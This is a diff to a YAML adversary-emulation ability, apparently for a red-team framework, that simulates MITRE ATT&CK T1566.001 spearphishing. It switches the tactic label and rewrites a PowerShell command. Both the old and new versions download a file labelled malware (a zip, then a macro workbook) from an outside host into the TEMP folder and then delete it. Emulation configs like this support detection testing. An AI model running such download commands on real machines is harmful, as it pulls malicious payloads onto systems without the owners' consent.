@@ -1,7 +1,7 @@
-- tactic: initial-access
+- tactic: execution
   technique_name: 'Phishing: Spearphishing Attachment'
   technique_id: T1566.001
-  name: 'Malware: Download phishing sample file'
+  name: 'Malware: Download phishing attachment'
   description: Adversaries may use spearphishing emails with malicious attachments
     to gain access to victim systems. These attachments, such as Office documents,
     executables, PDFs, or archived files, exploit vulnerabilities or execute malware
@@ -12,8 +12,9 @@
   executors:
   - name: psh
     platform: windows
-    command: "Invoke-WebRequest http://198.18.133.49/malware/phish.zip -OutFile $env:TEMP/phish.zip;\
-      \ \nStart-Sleep -Seconds 3; \nRemove-Item \"$env:TEMP\\phish.zip\" -Force"
+    command: 'Invoke-WebRequest #{ignite.url}/malware/macro.xlsm -OutFile $env:TEMP/phish.zip;
+      if (Test-Path "$env:TEMP/phish.zip") { Remove-Item "$env:TEMP/phish.zip" -Force
+      }'
     code: null
     language: null
     build_target: null
